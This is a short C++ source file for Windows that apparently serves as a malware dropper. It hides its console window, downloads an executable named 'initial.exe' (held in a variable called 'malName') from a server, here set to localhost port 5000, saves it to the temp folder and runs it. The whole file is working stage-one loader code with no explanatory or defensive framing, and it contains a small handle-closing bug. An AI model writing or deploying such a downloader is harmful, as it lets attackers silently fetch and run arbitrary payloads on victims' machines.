#include <urlmon.h>
#include <windows.h>
#include <tchar.h>
#include <wininet.h>
#include <fileapi.h>
#include <shlwapi.h>

int _tmain(int argc, _TCHAR *argv[]){
    FreeConsole();

    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);

    const wchar_t* URL = L"http://127.0.0.1:5000/initial";
    const wchar_t* malName= L"initial.exe";
    wchar_t buffer[MAX_PATH];
    PathCombineW(buffer, tempPath, malName );

    STARTUPINFO si;
	PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);

    DeleteUrlCacheEntryW(URL);

    auto status = URLDownloadToFileW(NULL,URL, buffer, 0 , NULL);
    if (SUCCEEDED(status)){
        if (!CreateProcessW(nullptr, (LPWSTR) buffer, nullptr, nullptr, FALSE, 0, nullptr, nullptr,  &si, &pi)){
            CloseHandle(pi.hProcess);
        }
    }

    return 0;
}